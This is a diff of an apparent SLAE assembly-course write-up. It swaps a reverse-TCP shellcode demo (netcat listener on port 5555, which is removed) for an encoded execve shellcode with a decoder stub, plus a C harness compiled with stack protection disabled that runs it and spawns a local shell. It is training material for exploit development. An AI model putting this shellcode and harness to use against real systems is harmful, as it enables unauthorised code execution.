@@ -188,7 +188,7 @@ A simple C program scripted and edited with the newly generated shellcode:
 #include <stdio.h>
 #include <string.h>
 
-unsigned char code[] = \
+unsigned char decoder[] = \
 "\xeb\x17\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x0f\x8a\x06\x86\x46"
 "\x01\x88\x06\x83\xc6\x02\xe2\xf4\xeb\x05\xe8\xe4\xff\xff\xff"
 "\xc0\x31\x68\x50\x61\x62\x68\x73\x62\x68\x6e\x69\x68\x2f\x2f"
@@ -196,31 +196,24 @@ unsigned char code[] = \
 
 int main()
 {
-        printf("Shellcode length:  %d\n", strlen(code));
-        int (*ret)() = (int(*)())code;
+        printf("Shellcode length:  %d\n", strlen(decoder));
+        int (*ret)() = (int(*)())decoder;
         ret();
 }
 ```
 
-#### POC (Final Shellcode) 
+#### POC  
 ------
 
-The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 92 bytes:
+The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 60 bytes:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o reverse_shell_tcp_final
-osboxes@osboxes:~/Downloads/SLAE$ ./reverse_shell_tcp_final
-Shellcode length: 92 bytes
-
-```
-
-A separate terminal demonstrating a successful reverse connection and shell on the local host (via port 5555):
-
-```bash
-osboxes@osboxes:~$ nc -lv 5555
-Connection from 127.0.0.1 port 5555 [tcp/*] accepted
-id
+osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o encoder_final
+osboxes@osboxes:~/Downloads/SLAE$ ./encoder_final 
+Shellcode length:  60
+osboxes@osboxes:/home/osboxes/Downloads/SLAE$ id
 uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
+ 
 ```
 
 ##### SLAE Disclaimer ####
